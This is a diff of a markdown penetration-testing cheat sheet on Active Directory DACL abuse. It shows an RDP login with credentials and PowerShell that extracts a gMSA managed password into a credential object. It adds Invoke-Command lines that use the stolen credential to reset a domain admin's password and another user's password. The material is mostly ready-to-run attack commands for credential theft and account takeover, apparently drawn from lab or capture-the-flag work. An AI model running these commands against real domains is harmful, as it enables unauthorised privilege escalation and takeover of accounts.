@@ -21,7 +21,7 @@ Using netexec:
 ### <ins>RDP to host using xfreerdp</ins>:
 - `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`
 
-# BloodHound Dacls Abuse
+# <ins>BloodHound Dacls Abuse</ins>
 
 ### GMSAPasswordReader
 
@@ -36,3 +36,8 @@ If the clear-text password not appear, let's just use it.
 
     $password = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
     $cred = New-Object System.Management.Automation.PSCredential "GroupName" , $password
+
+Now we got the credentials Objects, let's open a new session with the privileged user:
+
+    Invoke-Command -ComputerName 127.0.0.1 -cred $cred -ScriptBlock {net user DomainAdminmUser P@ssw0rd1!}
+    Invoke-Command -ComputerName 127.0.0.1 -Credential $cred -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -Force)}
